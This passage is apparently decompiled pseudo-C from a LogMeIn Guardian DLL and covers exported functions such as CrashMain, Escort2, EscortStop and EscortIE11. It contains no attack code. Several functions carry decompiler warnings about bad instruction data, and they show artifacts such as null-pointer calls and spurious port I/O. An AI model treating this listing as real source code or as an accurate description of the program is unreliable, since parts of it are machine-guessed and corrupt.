/* WARNING: Type propagation algorithm not settling */

void FUN_100146c0(void)

{
  int iVar1;
  undefined4 local_18;
  uint local_14 [2];
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  local_14[0] = 1;
  if ((DAT_10099158 & 1) == 0) {
    DAT_10099158 = DAT_10099158 | 1;
    FUN_100064d0();
    FUN_10057b51(&LAB_10078190);
  }
  local_14[1] = 0;
  local_c = 0x500;
  if (((DAT_100990e4 != (code *)0x0) && (local_14[0] != 0)) &&
     (local_14[0] = (*DAT_100990e4)(local_14 + 1,1,4,0,0,0,0,0,0,0,&local_18), local_14[0] != 0)) {
    if (DAT_1009913c == (code *)0x0) {
      local_14[0] = 0;
    }
    else {
      iVar1 = (*DAT_1009913c)(0,local_18,local_14);
      local_14[0] = -(uint)(iVar1 != 0) & local_14[0];
    }
    if (DAT_100990ec == 0) {
      (*(code *)0x0)(local_18);
    }
  }
  FUN_100579df();
  return;
}



/* Function: FUN_10014790 */

void __thiscall FUN_10014790(int *param_1,uint param_2)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  int iVar4;
  uint uVar5;
  
  iVar2 = *param_1;
  if (iVar2 != 0) {
    if (param_2 == 0xffffffff) {
      pcVar3 = (char *)(iVar2 + 0xc);
      if (pcVar3 != (char *)0x0) {
        do {
          cVar1 = *pcVar3;
          pcVar3 = pcVar3 + 1;
        } while (cVar1 != '\0');
        iVar4 = (int)pcVar3 - (iVar2 + 0xd);
        *(int *)(iVar2 + 8) = iVar4;
        *(undefined1 *)(iVar4 + 0xc + iVar2) = 0;
        return;
      }
      *(undefined4 *)(iVar2 + 8) = 0;
      *(undefined1 *)(iVar2 + 0xc) = 0;
      return;
    }
    uVar5 = *(int *)(iVar2 + 4) - 1;
    if (uVar5 <= param_2) {
      param_2 = uVar5;
    }
    *(uint *)(iVar2 + 8) = param_2;
    *(undefined1 *)(param_2 + 0xc + iVar2) = 0;
  }
  return;
}



/* Function: FUN_10014800 */

undefined4 * __thiscall FUN_10014800(undefined4 *param_1,int param_2)

{
  uint uVar1;
  int *piVar2;
  undefined4 uVar3;
  int iVar4;
  byte in_AF;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074bab;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  piVar2 = (int *)FUN_100582fa(0xc,uVar1);
  local_8 = 0;
  if (piVar2 != (int *)0x0) {
    piVar2[1] = 0;
    piVar2[2] = 1;
    uVar3 = FUN_1038a73a(param_2,uVar1);
    in_AF = 9 < ((byte)uVar3 & 0xf) | in_AF;
    uVar1 = CONCAT31((int3)((uint)uVar3 >> 8),(byte)uVar3 + in_AF * -6) & 0xffffff0f;
    iVar4 = CONCAT22((short)(uVar1 >> 0x10),CONCAT11((char)((uint)uVar3 >> 8) - in_AF,(char)uVar1));
    *piVar2 = iVar4;
    if ((iVar4 != 0) || (param_2 == 0)) goto LAB_1001486f;
    FUN_10073c10(0x8007000e);
  }
  piVar2 = (int *)0x0;
LAB_1001486f:
  local_8 = 0xffffffff;
  *param_1 = piVar2;
  if (piVar2 == (int *)0x0) {
    FUN_10073c10(0x8007000e);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_100148a0 */

/* WARNING: Control flow encountered bad instruction data */

void __fastcall FUN_100148a0(int *param_1)

{
  int iVar1;
  ushort uVar2;
  ushort uVar3;
  int unaff_EBX;
  int unaff_EBP;
  undefined2 in_ES;
  undefined2 uVar5;
  int iVar4;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    uVar5 = 0x1001;
    FUN_1056cca3(iVar1 + 8);
    uVar2 = (ushort)*(byte *)(unaff_EBX + -0x75 + iVar1);
    uVar3 = (ushort)*(undefined4 *)(unaff_EBP + -0x7ac88a40);
    iVar4 = CONCAT22((short)((uint)*(undefined4 *)(unaff_EBP + -0x7ac88a40) >> 0x10),
                     CONCAT11((char)(uVar3 % uVar2),(char)(uVar3 / uVar2)));
    if (iVar4 != 0) {
      FUN_1047ef7c(iVar4);
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    if (*(int *)(iVar1 + 4) != 0) {
      thunk_FUN_100579ee(*(int *)(iVar1 + 4),CONCAT22(uVar5,in_ES));
      *(undefined4 *)(iVar1 + 4) = 0;
    }
    thunk_FUN_100579ee(iVar1);
    *param_1 = 0;
  }
  return;
}



/* Function: FUN_10014900 */

int __fastcall FUN_10014900(int *param_1)

{
  undefined4 *puVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074bdb;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*param_1 == 0) {
    puVar1 = (undefined4 *)FUN_100582fa(0xc,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    if (puVar1 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)0x0;
    }
    else {
      puVar1[1] = 0;
      puVar1[2] = 1;
      *puVar1 = 0;
    }
    local_8 = 0xffffffff;
    *param_1 = (int)puVar1;
    if (puVar1 == (undefined4 *)0x0) {
      FUN_10073c10(0x8007000e);
    }
  }
  ExceptionList = local_10;
  return *param_1;
}



/* Function: FUN_10014980 */

undefined1 * __thiscall FUN_10014980(int *param_1,int *param_2,int *param_3)

{
  undefined1 uVar1;
  undefined1 *puVar2;
  int iVar3;
  code *extraout_ECX;
  code *extraout_ECX_00;
  code *pcVar4;
  undefined2 extraout_DX;
  undefined2 extraout_DX_00;
  int iVar5;
  undefined1 *puVar6;
  undefined4 uVar7;
  int *piVar8;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074c10;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 1;
  if (param_3 == (int *)0x0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *param_3;
  }
  if (param_2 == (int *)0x0) {
    iVar5 = 0;
  }
  else {
    iVar5 = *param_2;
  }
  puVar2 = (undefined1 *)
           (**(code **)(*param_1 + 0x38))(param_1,iVar5,iVar3,DAT_100956e0 ^ (uint)&stack0xfffffffc)
  ;
  if ((int)puVar2 < 0) {
    FUN_10073c30(puVar2,param_1,&DAT_10083f38);
  }
  FUN_104b787c();
  pcVar4 = extraout_ECX;
  if (param_2 != (int *)0x0) {
    piVar8 = param_2 + 2;
    uVar7 = 0x100149f4;
    iVar3 = (*extraout_ECX)(piVar8);
    if ((iVar3 == 0) && (param_2 != (int *)0x0)) {
      if (*param_2 != 0) {
        uVar1 = FUN_10586cf5(*param_2);
        out(extraout_DX,uVar1);
        *param_2 = 0;
      }
      if (param_2[1] != 0) {
        thunk_FUN_100579ee(param_2[1]);
        param_2[1] = 0;
      }
      thunk_FUN_100579ee(param_2);
    }
    FUN_10197c8a(uVar7,piVar8);
    pcVar4 = extraout_ECX_00;
  }
  puVar6 = puVar2;
  if (param_3 != (int *)0x0) {
    iVar3 = (*pcVar4)(param_3 + 2);
    if ((iVar3 == 0) && (param_3 != (int *)0x0)) {
      if (*param_3 != 0) {
        FUN_104507ff(*param_3);
        puVar6 = puVar2 + 1;
        uVar1 = in(extraout_DX_00);
        *puVar2 = uVar1;
        *param_3 = 0;
      }
      if (param_3[1] != 0) {
        thunk_FUN_100579ee(param_3[1]);
        param_3[1] = 0;
      }
      thunk_FUN_100579ee(param_3);
    }
  }
  ExceptionList = local_10;
  return puVar6;
}



/* Function: CrashMain */

void CrashMain(short *param_1,undefined4 *param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  code *pcVar2;
  uint uVar3;
  int *piVar4;
  int *piVar5;
  int iVar6;
  int iVar7;
  undefined4 *puVar8;
  int *piVar9;
  int extraout_ECX;
  int extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  int extraout_ECX_03;
  int extraout_ECX_04;
  undefined **ppuVar10;
  uint extraout_ECX_05;
  uint extraout_ECX_06;
  uint extraout_ECX_07;
  uint extraout_ECX_08;
  int extraout_ECX_09;
  int extraout_ECX_10;
  int extraout_ECX_11;
  int extraout_ECX_12;
  int extraout_ECX_13;
  int extraout_ECX_14;
  undefined4 extraout_ECX_15;
  undefined8 uVar11;
  ulonglong uVar12;
  wchar_t *pwVar13;
  undefined4 uVar14;
  undefined1 *puVar15;
  int **ppiVar16;
  undefined1 auStack_bc [4];
  int *piStack_b8;
  int *local_b4;
  int *local_b0;
  int *piStack_a8;
  int **ppiStack_a4;
  int *piStack_a0;
  int *piStack_9c;
  short *local_98;
  int *local_94;
  undefined4 local_90;
  int *piStack_8c;
  ulonglong local_88;
  undefined8 uStack_80;
  int *piStack_74;
  undefined4 local_70;
  int *piStack_6c;
  int *piStack_64;
  undefined4 uStack_60;
  int iStack_5c;
  undefined4 uStack_58;
  undefined4 *local_54;
  undefined1 local_48 [28];
  undefined2 uStack_2c;
  undefined2 uStack_28;
  ushort uStack_20;
  uint local_c;
  
                    /* 0x14aa0  2  CrashMain */
  local_c = DAT_100956e0 ^ (uint)auStack_bc;
  local_54 = param_2;
  local_70 = param_4;
  local_98 = param_1;
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar3 = FUN_10049e00();
    DAT_1009ad0c = uVar3 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((param_1 == (short *)0x0) || (*param_1 != 0)) {
    FUN_1000bd10();
  }
  else {
    FUN_1000ba60();
  }
  piVar4 = (int *)FUN_1000bfa0(&DAT_10083854,0xffffffff);
  local_90 = 0;
  local_b4 = piVar4;
  if (((piVar4 == (int *)0x0) || (piVar4 + 3 == (int *)0x0)) || ((short)piVar4[3] != 0)) {
    piVar5 = (int *)FUN_1000bd10();
  }
  else {
    piVar5 = (int *)FUN_1000ba60();
  }
  local_94 = piVar5;
  iVar6 = FUN_10041600(&local_90);
  local_88 = CONCAT44(local_88._4_4_,iVar6);
  iVar7 = extraout_ECX;
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar5;
    iVar7 = *piVar5;
    *piVar5 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar5);
      iVar6 = (int)(int *)local_88;
      iVar7 = extraout_ECX_00;
    }
  }
  if (iVar6 != 0) {
    if ((DAT_1009b62c & 1) == 0) {
      DAT_1009b62c = DAT_1009b62c | 1;
      FUN_10041080(iVar7);
      FUN_10057b51(&LAB_10078990);
    }
    puVar15 = local_48;
    local_b0 = (int *)0x0;
    pwVar13 = L"LMIGuardianSvc.GuardianSvc";
    iVar7 = FUN_10514301(&stack0xfffffffc,L"LMIGuardianSvc.GuardianSvc",puVar15);
    uVar3 = extraout_ECX_01;
    if (-1 < iVar7) {
      FUN_10015560(local_48,pwVar13,puVar15);
      uVar3 = extraout_ECX_02;
    }
    if (local_b0 != (int *)0x0) {
      uStack_80 = 0;
      (**(code **)(*local_b0 + 0x1c))(local_b0,&uStack_80);
      iVar7 = (*DAT_10079264)();
      piStack_64 = (int *)0x0;
      uStack_60 = 0;
      piStack_64 = (int *)FUN_10018da0(0,0);
      uStack_58 = 0;
      iStack_5c = iVar7;
      if (iVar7 != 0) {
        FUN_10022ca0(iVar7);
      }
      piVar9 = (int *)*piStack_64;
      iVar7 = 0;
      piVar5 = (int *)0x0;
      if (piVar9 != piStack_64) {
        do {
          if (&DAT_10084ce4 < (undefined *)piVar9[3]) break;
          piVar5 = piVar9 + 2;
          piVar9 = (int *)*piVar9;
        } while (piVar9 != piStack_64);
        if (piVar5 != (int *)0x0) {
          iVar7 = piVar5[1];
        }
      }
      FUN_10022c10();
      FUN_1002e880(iVar7);
      uVar3 = CONCAT22(uStack_2c,uStack_28);
      if ((uVar3 <= uStack_80._4_4_) &&
         ((uVar3 < uStack_80._4_4_ || (uStack_20 <= (uint)uStack_80)))) {
        puVar8 = (undefined4 *)FUN_10021a40(0,1);
        piVar5 = (int *)*puVar8;
        if (piVar5 != (int *)0x0) {
          LOCK();
          *piVar5 = *piVar5 + 1;
          UNLOCK();
        }
        piStack_8c = piVar5;
        if (piStack_b8 != (int *)0x0) {
          LOCK();
          iVar7 = *piStack_b8;
          *piStack_b8 = iVar7 + -1;
          UNLOCK();
          if (iVar7 + -1 < 0) {
            FUN_100579ee(piStack_b8);
          }
        }
        if (piVar5 == (int *)0x0) {
          piVar9 = (int *)0x0;
        }
        else {
          piVar9 = piVar5 + 3;
        }
        FUN_10014800(piVar9);
        piStack_a0 = (int *)0x0;
        piStack_9c = (int *)0x0;
        local_88 = 0;
        if ((local_98 == (short *)0x0) || (*local_98 != 0)) {
          piStack_a8 = (int *)FUN_1000bd10();
        }
        else {
          piStack_a8 = (int *)FUN_1000ba60();
        }
        piStack_b8 = (int *)FUN_100414b0(&piStack_a0);
        iVar7 = extraout_ECX_03;
        if (piStack_a8 != (int *)0x0) {
          LOCK();
          iVar6 = *piStack_a8;
          iVar7 = *piStack_a8;
          *piStack_a8 = iVar6 + -1;
          UNLOCK();
          if (iVar6 + -1 < 0) {
            FUN_100579ee(piStack_a8);
            iVar7 = extraout_ECX_04;
          }
        }
        piVar9 = local_b0;
        if (piStack_b8 == (int *)0x0) {
          if ((uStack_80._4_4_ < 0xa0002) &&
             ((uStack_80._4_4_ < 0xa0001 || ((uint)uStack_80 < 0x663)))) {
            if (local_b0 == (int *)0x0) {
LAB_100151c0:
              FUN_10073c10(0x80004003);
LAB_100151ca:
              FUN_10073c10(0x80004003);
              pcVar2 = (code *)swi(3);
              (*pcVar2)();
              return;
            }
            iVar7 = *local_b0;
            puVar8 = (undefined4 *)FUN_10014900();
            iVar7 = (**(code **)(iVar7 + 0x20))(piVar9,local_90,*puVar8);
          }
          else {
            if (local_b0 == (int *)0x0) goto LAB_100151ca;
            puVar8 = (undefined4 *)FUN_10033a00(local_98,iVar7);
            iVar7 = *piVar9;
            piStack_b8 = (int *)*puVar8;
            if (piStack_b8 == (int *)0x0) {
              piStack_b8 = (int *)0x1;
            }
            puVar8 = (undefined4 *)FUN_10014900();
            iVar7 = (**(code **)(iVar7 + 0x3c))(piVar9,local_90,*puVar8,piStack_b8);
          }
LAB_10014fc6:
          if (iVar7 == 0) {
            FUN_10006f30();
            FUN_10006f30();
            FUN_100148a0();
            FUN_10006f30();
            if (local_b0 != (int *)0x0) {
              (**(code **)(*local_b0 + 8))(local_b0);
            }
            goto LAB_10015188;
          }
          FUN_10006f30();
          FUN_10006f30();
          FUN_100148a0();
          FUN_10006f30();
          uVar3 = extraout_ECX_08;
        }
        else {
          if ((piStack_a0 == (int *)0x0) ||
             (ppuVar10 = (undefined **)(piStack_a0 + 3), ppuVar10 == (undefined **)0x0)) {
            ppuVar10 = &PTR_10083554;
          }
          uVar11 = FUN_1004b7e0(ppuVar10);
          piStack_a8 = (int *)((ulonglong)uVar11 >> 0x20);
          local_b4 = (int *)uVar11;
          if ((local_98 == (short *)0x0) || (*local_98 != 0)) {
            ppiStack_a4 = (int **)FUN_1000bd10();
          }
          else {
            ppiStack_a4 = (int **)FUN_1000ba60();
          }
          ppiVar16 = &piStack_9c;
          uVar14 = 0x10014ded;
          piStack_b8 = (int *)FUN_100414b0(ppiVar16);
          if (ppiStack_a4 != (int **)0x0) {
            LOCK();
            piVar9 = *ppiStack_a4;
            *ppiStack_a4 = (int *)((int)piVar9 + -1);
            UNLOCK();
            if ((int)piVar9 + -1 < 0) {
              uVar14 = 0x10014e0a;
              ppiVar16 = ppiStack_a4;
              FUN_100579ee(ppiStack_a4);
            }
          }
          uVar12 = local_88;
          if (piStack_b8 != (int *)0x0) {
            uVar12 = FUN_10015540(uVar14,ppiVar16);
          }
          piVar9 = local_b0;
          local_94 = (int *)(uVar12 >> 0x20);
          ppiStack_a4 = (int **)uVar12;
          if ((local_b4 == (int *)0x0 && piStack_a8 == (int *)0x0) || (uVar12 == 0)) {
            if (piStack_9c != (int *)0x0) {
              LOCK();
              iVar7 = *piStack_9c;
              *piStack_9c = iVar7 + -1;
              UNLOCK();
              if (iVar7 + -1 < 0) {
                FUN_100579ee(piStack_9c);
                uVar12 = CONCAT44(local_94,ppiStack_a4);
              }
            }
            local_94 = (int *)(uVar12 >> 0x20);
            ppiStack_a4 = (int **)uVar12;
            if (piStack_a0 != (int *)0x0) {
              LOCK();
              iVar7 = *piStack_a0;
              *piStack_a0 = iVar7 + -1;
              UNLOCK();
              if (iVar7 + -1 < 0) {
                FUN_100579ee(piStack_a0);
                uVar12 = CONCAT44(local_94,ppiStack_a4);
              }
            }
            local_94 = (int *)(uVar12 >> 0x20);
            ppiStack_a4 = (int **)uVar12;
            FUN_100148a0();
            uVar3 = extraout_ECX_06;
            if (piVar5 != (int *)0x0) {
              LOCK();
              iVar7 = *piVar5;
              *piVar5 = iVar7 + -1;
              UNLOCK();
              if (iVar7 + -1 < 0) {
                FUN_100579ee(piVar5);
                uVar3 = extraout_ECX_07;
              }
            }
          }
          else {
            if ((0xa0001 < uStack_80._4_4_) ||
               ((0xa0000 < uStack_80._4_4_ && (0x664 < (uint)uStack_80)))) {
              if (local_b0 == (int *)0x0) {
                FUN_10073c10(0x80004003);
                goto LAB_100151c0;
              }
              puVar8 = (undefined4 *)FUN_10033a00(local_98,ppiStack_a4);
              iVar7 = *piVar9;
              piStack_b8 = (int *)*puVar8;
              if (piStack_b8 == (int *)0x0) {
                piStack_b8 = (int *)0x1;
              }
              puVar8 = (undefined4 *)FUN_10014900();
              iVar7 = (**(code **)(iVar7 + 0x40))
                                (piVar9,local_90,*puVar8,piStack_b8,local_b4,piStack_a8,ppiStack_a4,
                                 local_94);
              goto LAB_10014fc6;
            }
            FUN_10006f30();
            FUN_10006f30();
            FUN_100148a0();
            FUN_10006f30();
            uVar3 = extraout_ECX_05;
          }
        }
      }
    }
    FUN_1000bdd0(L"/ESCORT ",uVar3);
    piVar4 = (int *)FUN_100155d0(local_90,10);
    local_88 = local_88 & 0xffffffff00000000;
    local_b4 = piVar4;
    if ((local_98 == (short *)0x0) || (*local_98 != 0)) {
      piVar5 = (int *)FUN_1000bd10();
    }
    else {
      piVar5 = (int *)FUN_1000ba60();
    }
    piStack_74 = piVar5;
    piStack_b8 = (int *)FUN_100414b0(&local_88);
    iVar7 = extraout_ECX_09;
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar6 = *piVar5;
      iVar7 = *piVar5;
      *piVar5 = iVar6 + -1;
      UNLOCK();
      if (iVar6 + -1 < 0) {
        FUN_100579ee(piVar5);
        iVar7 = extraout_ECX_10;
      }
    }
    piVar5 = (int *)local_88;
    if (piStack_b8 == (int *)0x0) {
LAB_100150e1:
      if (piVar5 != (int *)0x0) {
        LOCK();
        iVar6 = *piVar5;
        *piVar5 = iVar6 + -1;
        UNLOCK();
        if (iVar6 + -1 < 0) {
          FUN_100579ee(piVar5);
          iVar7 = extraout_ECX_13;
        }
      }
    }
    else {
      piVar4 = (int *)FUN_1000bfa0(&DAT_10083854,0xffffffff);
      iVar7 = extraout_ECX_11;
      local_b4 = piVar4;
      if (piVar5 != (int *)0x0) {
        if (piVar5[2] != 0) {
          piVar4 = (int *)FUN_1000bfa0(piVar5 + 3,piVar5[2]);
          iVar7 = extraout_ECX_12;
          local_b4 = piVar4;
        }
        goto LAB_100150e1;
      }
    }
    if (local_b0 != (int *)0x0) {
      (**(code **)(*local_b0 + 8))(local_b0);
      iVar7 = extraout_ECX_14;
    }
  }
  if (piVar4 == (int *)0x0) {
    piVar4 = (int *)0x0;
  }
  else {
    piVar4 = piVar4 + 3;
  }
  FUN_10024730(piVar4,iVar7,0,0,local_70);
  puVar8 = local_54;
  if ((piStack_6c != (int *)0x0) && (piStack_6c[2] != 0)) {
    uVar14 = FUN_10010440(piStack_6c);
    *puVar8 = uVar14;
    if ((DAT_1009b624 & 1) == 0) {
      DAT_1009b624 = DAT_1009b624 | 1;
      FUN_1003ef60(L"LogMeIn Guardian",extraout_ECX_15);
      FUN_10057b51(&LAB_10078950);
    }
  }
  piVar4 = local_b4;
  if (piStack_6c != (int *)0x0) {
    LOCK();
    iVar7 = *piStack_6c;
    *piStack_6c = iVar7 + -1;
    UNLOCK();
    if (iVar7 + -1 < 0) {
      FUN_100579ee(piStack_6c);
      piVar4 = local_b4;
    }
  }
LAB_10015188:
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar7 = *piVar4;
    *piVar4 = *piVar4 + -1;
    UNLOCK();
    if (iVar7 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  FUN_100579df();
  return;
}



/* Function: Escort2 */

void Escort2(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  uint uVar1;
  
                    /* 0x151e0  3  Escort2 */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((DAT_1009b474 & 1) == 0) {
    DAT_1009b474 = DAT_1009b474 | 1;
    FUN_10019300();
    FUN_10057b51(&DAT_10078490);
  }
  FUN_10019400(param_1,param_2,param_3,param_4,param_5);
  return;
}



/* Function: EscortStop */

void EscortStop(undefined4 param_1)

{
  uint uVar1;
  
                    /* 0x15250  5  EscortStop */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((DAT_1009b474 & 1) == 0) {
    DAT_1009b474 = DAT_1009b474 | 1;
    FUN_10019300();
    FUN_10057b51(&DAT_10078490);
  }
  FUN_10019540(param_1);
  return;
}



/* Function: OffLoad */

void __fastcall OffLoad(undefined4 param_1)

{
  uint uVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  
                    /* 0x152c0  10  OffLoad */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
    param_1 = extraout_ECX;
  }
  if ((DAT_1009b474 & 1) == 0) {
    DAT_1009b474 = DAT_1009b474 | 1;
    FUN_10019300();
    FUN_10057b51(&DAT_10078490);
    param_1 = extraout_ECX_00;
  }
  FUN_10019670(param_1);
  return;
}



/* Function: IsSamePath */

undefined4 IsSamePath(undefined4 param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  
                    /* 0x15320  8  IsSamePath */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((DAT_1009b474 & 1) == 0) {
    DAT_1009b474 = DAT_1009b474 | 1;
    FUN_10019300();
    FUN_10057b51(&DAT_10078490);
  }
  if (param_2 != 0) {
    uVar2 = FUN_10019900(param_2);
    return uVar2;
  }
  return 0x57;
}



/* Function: SetLogLabelLow */

/* WARNING: Removing unreachable block (ram,0x1001547a) */
/* WARNING: Removing unreachable block (ram,0x10015437) */
/* WARNING: Removing unreachable block (ram,0x1001545b) */
/* WARNING: Removing unreachable block (ram,0x10015461) */
/* WARNING: Removing unreachable block (ram,0x1001546d) */
/* WARNING: Removing unreachable block (ram,0x10015473) */
/* WARNING: Removing unreachable block (ram,0x100154b1) */
/* WARNING: Removing unreachable block (ram,0x10015498) */

void SetLogLabelLow(void)

{
  uint uVar1;
  undefined4 in_stack_ffffffbc;
  undefined4 uVar2;
  undefined1 local_18 [16];
  uint local_8;
  
                    /* 0x15390  11  SetLogLabelLow */
  local_8 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((DAT_1009b62c & 1) == 0) {
    DAT_1009b62c = DAT_1009b62c | 1;
    FUN_10041080();
    FUN_10057b51();
  }
  uVar2 = 0x10015410;
  FUN_10416ede();
  FUN_10015560(local_18,in_stack_ffffffbc,uVar2);
  FUN_100579df();
  return;
}



/* Function: EscortIE11 */

void EscortIE11(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
               undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,
               undefined4 param_9)

{
  uint uVar1;
  
                    /* 0x154c0  4  EscortIE11 */
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    uVar1 = FUN_10049e00();
    DAT_1009ad0c = uVar1 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  if ((DAT_1009b474 & 1) == 0) {
    DAT_1009b474 = DAT_1009b474 | 1;
    FUN_10019300();
    FUN_10057b51(&DAT_10078490);
  }
  FUN_10019b50(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  return;
}



/* Function: FUN_10015540 */

void __fastcall FUN_10015540(int *param_1)

{
  undefined **ppuVar1;
  
  if ((*param_1 == 0) || (ppuVar1 = (undefined **)(*param_1 + 0xc), ppuVar1 == (undefined **)0x0)) {
    ppuVar1 = &PTR_10083554;
  }
  FUN_1004b7e0(ppuVar1,param_1);
  return;
}



/* Function: FUN_10015560 */

int __fastcall FUN_10015560(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)*param_1;
  if (piVar1 != (int *)0x0) {
    (**(code **)(*piVar1 + 8))(piVar1);
  }
  iVar2 = FUN_104c231e();
  if (-1 < iVar2) {
    iVar2 = FUN_105eb70b(param_1);
    if (-1 < iVar2) {
      iVar2 = (**(code **)*param_1)(param_1,&DAT_10083f38,param_1);
    }
    (**(code **)(*param_1 + 8))(param_1);
    if (-1 < iVar2) {
      return iVar2;
    }
  }
  *param_1 = 0;
  return iVar2;
}



/* Function: FUN_100155d0 */

int * __thiscall FUN_100155d0(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_1 == (int *)0x0) {
LAB_10015658:
    uVar4 = 0;
  }
  else {
    if (*param_1 != 0) {
      iVar1 = FUN_1004bba0(0,param_3);
      if (iVar1 == 0) {
        return param_1;
      }
      piVar2 = (int *)FUN_10010370(param_1[2] + iVar1,1);
      if (piVar2 == (int *)0x0) {
        return param_1;
      }
      goto LAB_10015618;
    }
    if (param_1 == (int *)0x0) goto LAB_10015658;
    uVar4 = param_1[1] - param_1[2];
  }
  uVar3 = FUN_1004bba0(uVar4,param_3);
  if (uVar3 < uVar4) {
    param_1[2] = param_1[2] + uVar3;
    return param_1;
  }
  if (param_1 == (int *)0x0) {
    iVar1 = 0;
  }
  else {
    iVar1 = param_1[2];
  }
  piVar2 = (int *)FUN_10010290(iVar1 + uVar3);
  if (piVar2 == (int *)0x0) {
    if (param_1 != (int *)0x0) {
      *(undefined2 *)((int)param_1 + param_1[2] * 2 + 0xc) = 0;
    }
    return param_1;
  }
LAB_10015618:
  iVar1 = FUN_1004bba0(piVar2[1] - piVar2[2],param_3);
  piVar2[2] = piVar2[2] + iVar1;
  return piVar2;
}



/* Function: FUN_100156c0 */

/* WARNING: Instruction at (ram,0x100156ff) overlaps instruction at (ram,0x100156fe)
    */

uint __thiscall FUN_100156c0(undefined4 *param_1,undefined4 param_2)

{
  *param_1 = param_2;
  *(undefined2 *)(param_1 + 1) = 0;
  FUN_10015710();
  FUN_1030e596(0,u_LMIGuardianSvc_main_10096748,u_LMIGuardianSvc_hidden_10096680,0,0,0x14,10,10,0,0,
               *param_1,0);
  return (uint)param_1 & 0xffff;
}



/* Function: FUN_10015710 */

void __fastcall FUN_10015710(undefined4 *param_1)

{
  undefined2 uVar1;
  char extraout_CH;
  char *pcVar2;
  byte bVar3;
  undefined8 uVar4;
  undefined4 local_34;
  undefined4 local_30;
  code *local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  ushort *local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  wchar_t *local_c;
  undefined4 local_8;
  
  bVar3 = &stack0xfffffffc < (undefined1 *)0x34;
  local_34 = 0x30;
  local_30 = 3;
  local_2c = FUN_10015820;
  local_20 = *param_1;
  local_28 = 0;
  local_24 = 0;
  uVar4 = FUN_105a1aee(local_20,0x83);
  pcVar2 = (char *)((ulonglong)uVar4 >> 0x20);
  local_1c = (ushort *)uVar4;
  *local_1c = *local_1c + (ushort)bVar3 * -(*local_1c & 3);
  *pcVar2 = *pcVar2 + extraout_CH;
  local_18 = FUN_101c424a(param_1);
  local_14 = 6;
  local_10 = 0;
  local_c = u_LMIGuardianSvc_main_10096748;
  local_8 = FUN_104b0e9d();
  uVar1 = FUN_102018aa(&local_34);
  *(undefined2 *)(param_1 + 1) = uVar1;
  return;
}



/* Function: FUN_100157a0 */

/* WARNING: Instruction at (ram,0x100157d0) overlaps instruction at (ram,0x100157cc)
    */

void FUN_100157a0(void)

{
  undefined4 uVar1;
  int iVar2;
  int extraout_ECX;
  code *pcVar3;
  code *unaff_ESI;
  code *unaff_EDI;
  char cVar4;
  char cVar5;
  int in_stack_7d830045;
  undefined1 local_20 [4];
  int iStack_1c;
  int iStack_18;
  int local_14;
  
  uVar1 = FUN_1034d3e0();
  iVar2 = (*unaff_ESI)(uVar1,0,0,0);
  pcVar3 = DAT_1007945c;
  if (iVar2 == 0) {
